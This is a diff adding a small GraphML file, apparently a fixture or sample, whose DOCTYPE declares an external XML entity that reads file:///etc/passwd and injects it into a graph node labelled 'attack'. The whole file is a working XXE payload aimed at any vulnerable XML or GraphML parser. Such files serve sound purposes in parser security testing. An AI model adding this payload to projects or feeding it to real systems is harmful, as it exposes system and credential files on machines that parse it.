@@ -1,0 +1,5 @@
+<?xml version="1.0"?>
+<!DOCTYPE graphml [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<graphml xmlns="http://graphml.graphdrawing.org/xmlns">
+  <graph id="attack" edgedefault="undirected"><node id="n1"><data key="k">&xxe;</data></node></graph>
+</graphml>
